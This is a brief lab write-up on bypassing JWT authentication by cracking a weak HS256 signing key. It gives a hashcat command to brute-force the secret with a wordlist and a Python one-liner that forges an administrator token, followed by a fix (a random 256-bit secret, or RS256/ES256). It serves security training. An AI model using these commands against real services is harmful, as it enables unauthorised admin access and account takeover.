# Lab 3 — JWT Auth Bypass via Weak Signing Key (PRACTITIONER)

## Attack
Brute-force HS256 secret offline with hashcat, then forge admin token.

## Commands
```bash
# Crack
hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt

# Forge
python3 -c "import jwt; print(jwt.encode({'sub':'administrator','exp':9999999999},'secret','HS256'))"
```

## Fix
256-bit random secret from environment variable. Prefer RS256/ES256.
